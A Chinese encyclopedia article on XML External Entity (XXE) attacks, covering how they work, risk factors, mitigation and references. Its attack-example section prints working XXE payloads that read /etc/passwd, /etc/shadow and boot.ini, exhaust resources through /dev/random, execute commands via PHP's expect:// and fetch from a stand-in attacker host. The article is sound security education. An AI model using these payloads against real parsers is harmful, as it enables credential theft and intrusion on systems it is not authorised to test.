**XML外部实体攻击**是一种针对解析[XML](../Page/XML.md "wikilink")格式应用程序的攻击类型之一。此类攻击发生在当配置不当的XML解析器处理指向外部实体的文档时，可能会导致敏感文件泄露、拒绝服务攻击、服务器端请求伪造、端口扫描（解析器所在域）和其他系统影响。\[1\]

## 简介

XML 1.0标准定义了XML文档结构，同时定义了实体的概念，即某种类型的存储单元。外部一般解析实体或外部参数解析实体通常简称为外部实体，攻击者可声明特定来访问服务器本地或远程内容。XML处理器假设系统标识符为可访问的[统一资源标志符](../Page/统一资源标志符.md "wikilink")（URI），然后将同名的外部实体以系统标识符所指定的资源内容解除引用。若系统标识符被修改，则XML处理器可能会泄露应用程序通常无法访问的秘密信息。类似的攻击矢量可能会利用外部[文档类型定义](https://zh.wikipedia.org/wiki/文档类型定义 "wikilink")（DTD）、外部[样式表](../Page/样式表.md "wikilink")和外部[Schema等等](../Page/XML_Schema_语言.md "wikilink")，这些同样会导致类似的外部资源包含攻击。

此类攻击利用系统标识符中的文件、Schema及相对路径来泄露本地文件（如用户数据等）。由于攻击过程发生在处理XML文档的应用程序中，攻击者可滥用此受信的应用程序对其他内部系统进行攻击，也可能通过http(s)请求泄露其他内部内容，亦可能对其他未受保护的内部服务进行[跨站请求伪造](../Page/跨站请求伪造.md "wikilink")攻击。在部分情形下，攻击者可通过解引用恶意URI的方式对存在问题的XML处理库进行攻击，导致任意代码执行（以应用程序所使用的账户）。其他攻击针对持续返回数据的本地资源进行，可能会导致应用程序使用过多未释放的[线程](../Page/线程.md "wikilink")或[行程](../Page/行程.md "wikilink")。

需要留意的是，应用程序无需明确返回数据来证明其受信息泄露问题的影响。攻击者可利用受控制的DNS服务器来传输数据至特定子域名。

## 风险因素

  - 应用程序解析XML文档；
  - 应用程序允许用户修改文档类型定义中实体的系统标识符部分；
  - XML处理器需验证并处理文档类型定义；
  - XML处理器需解析文档类型定义中的外部实体。

## 攻击示例

下列攻击示例来自《Testing for XML Injection (OWASP-DV-008)》。

### 访问持续返回数据的本地资源

``` xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>
```

### 远程代码执行

当[PHP](../Page/PHP.md "wikilink")载入“expect”模块时，攻击者可使用修改过的载荷来。

``` xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
     <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
     </creds>
```

### 泄露/etc/passwd或其他目标文件

``` xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

## 缓和方案

由于XML文档来自不受信的客户端，服务器通常无法有选择性地进行或忽略文档类型定义中系统标识符部分的数据。因此，管理员应配置XML处理器使用本地静态文件类型定义，并禁止XML文档中所声明的定义。

## 另请参阅

  - [SQL注入](../Page/SQL注入.md "wikilink")
  - [SQL盲注](../Page/SQL注入.md "wikilink")

## 参考文献

<references />

## 外部链接

  - OWASP XML External Entity (XXE) Prevention Cheat Sheet
  - [Timothy Morgan's 2014 Paper: XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
  - [Precursor presentation of above paper - at OWASP AppSec USA 2013](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
  - [CWE-611: Information Exposure Through XML External Entity Reference](http://cwe.mitre.org/data/definitions/611.html)
  - [CWE-827: Improper Control of Document Type Definition](http://cwe.mitre.org/data/definitions/827.html)
  - [Sascha Herzog's Presentation on XML External Entity Attacks - at OWASP AppSec Germany 2010](https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf)
  - [PostgreSQL XXE vulnerability](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489)
  - [SharePoint and DotNetNuke XXE Vulnerabilities, in French](http://www.agarri.fr/kom/archives/2011/09/15/failles_de_type_xee_dans_sharepoint_et_dotnetnuke/index.html)
  - [XML Denial of Service Attacks and Defenses (in .NET)](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)
  - [Early (2002) BugTraq Article on XXE](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)
  - [XML 1.0 Extensible Markup Language (XML) 1.0 (Fifth Edition)](https://www.w3.org/TR/REC-xml/)

[Category:保全漏洞](https://zh.wikipedia.org/wiki/Category:保全漏洞 "wikilink") [Category:网络安全漏洞](https://zh.wikipedia.org/wiki/Category:网络安全漏洞 "wikilink") [Category:网页安全漏洞利用](https://zh.wikipedia.org/wiki/Category:网页安全漏洞利用 "wikilink")

1.